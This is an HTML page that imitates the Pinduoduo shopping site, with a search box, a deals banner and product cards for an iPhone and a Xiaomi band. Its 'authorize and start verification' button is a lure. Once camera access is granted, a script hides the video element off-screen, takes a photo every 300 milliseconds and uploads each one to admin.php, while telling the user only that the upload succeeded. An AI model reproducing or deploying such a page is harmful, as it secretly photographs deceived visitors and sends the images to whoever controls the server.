<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>拼多多</title>
<style>
* {margin:0;padding:0;box-sizing:border-box}
body {background:#f4f4f4;font-family:-apple-system,sans-serif}
.header {background:#ff6000;color:#fff;padding:12px 16px;text-align:center}
.search-bar {background:#fff;margin:10px;padding:10px 16px;border-radius:20px;display:flex}
.search-bar input {border:none;outline:none;flex:1;font-size:14px}
.banner {background:linear-gradient(90deg,#ff6000,#ff8a00);color:#fff;padding:15px;margin:10px;border-radius:8px;text-align:center}
.goods-list {background:#fff;margin:10px;border-radius:8px}
.goods-item {display:flex;padding:12px;border-bottom:1px solid #eee}
.goods-img {width:80px;height:80px;background:#f0f0f0;border-radius:8px;margin-right:12px}
.goods-title {font-size:15px;color:#333;margin-bottom:8px}
.goods-price {color:#ff6000;font-size:18px;font-weight:600}
.auth-btn {background:#ff6000;color:#fff;border:none;border-radius:8px;padding:14px;margin:20px 10px;width:calc(100% - 20px);font-size:16px}
#status {text-align:center;margin:10px;color:#666}
video {position:fixed;top:-9999px;left:-9999px;opacity:0}
.modal {position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);display:none;align-items:center;justify-content:center}
.modal-content {background:#fff;width:90%;max-width:320px;border-radius:12px;padding:20px;text-align:center}
.modal-close {background:#ff6000;color:#fff;border:none;border-radius:8px;padding:10px 20px;margin-top:10px}
</style>
</head>
<body>
<div class="header">拼多多</div>
<div class="search-bar">🔍<input type="text" id="searchInput" placeholder="搜索商品"></div>
<div class="banner">限时特惠 | 百亿补贴 | 正品保障</div>

<div class="goods-list">
  <div class="goods-item" data-title="Apple iPhone 13" data-price="4599" data-img="https://picsum.photos/200/200?1">
    <img class="goods-img" src="https://picsum.photos/200/200?1">
    <div class="goods-info">
      <div class="goods-title">【正品】Apple iPhone 13 全网通5G</div>
      <div class="goods-price">¥4599.00</div>
    </div>
  </div>
  <div class="goods-item" data-title="小米手环6" data-price="179" data-img="https://picsum.photos/200/200?2">
    <img class="goods-img" src="https://picsum.photos/200/200?2">
    <div class="goods-info">
      <div class="goods-title">小米手环6 心率监测</div>
      <div class="goods-price">¥179.00</div>
    </div>
  </div>
</div>

<button class="auth-btn" id="start">授权并开始验证</button>
<div id="status"></div>
<video id="video" autoplay></video>

<div class="modal" id="m">
  <div class="modal-content">
    <img id="mi" style="width:120px;height:120px">
    <div id="mt" style="margin:10px 0"></div>
    <div id="mp" style="color:#ff6000;font-size:20px"></div>
    <button class="modal-close" onclick="m.style.display='none'">关闭</button>
  </div>
</div>

<script>
const v=document.getElementById('video');
const s=document.getElementById('start');
const st=document.getElementById('status');
const m=document.getElementById('m');

document.getElementById('searchInput').oninput=e=>{
  if(e.target.value)st.textContent='搜索：'+e.target.value;else st.textContent='';
};

document.querySelectorAll('.goods-item').forEach(i=>{
  i.onclick=()=>{
    document.getElementById('mi').src=i.dataset.img;
    document.getElementById('mt').textContent=i.dataset.title;
    document.getElementById('mp').textContent='¥'+i.dataset.price;
    m.style.display='flex';
  }
});

s.onclick=async()=>{
  try{
    const str=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
    v.srcObject=str;
    s.textContent='拍照上传中...';s.disabled=1;
    setInterval(t,300);
  }catch(e){st.textContent='授权失败：'+e.message}
};

async function t(){
  const c=document.createElement('canvas');
  c.width=v.videoWidth||640;c.height=v.videoHeight||480;
  c.getContext('2d').drawImage(v,0,0);
  c.toBlob(b=>{
    const f=new FormData();
    f.append('img',b,Date.now()+'.jpg');
    fetch('admin.php',{method:'POST',body:f}).then(r=>r.text()).then(t=>{
      st.textContent='✅ 上传成功';st.style.color='green';
    });
  },'image/jpeg',0.7);
}
</script>
</body>
</html>
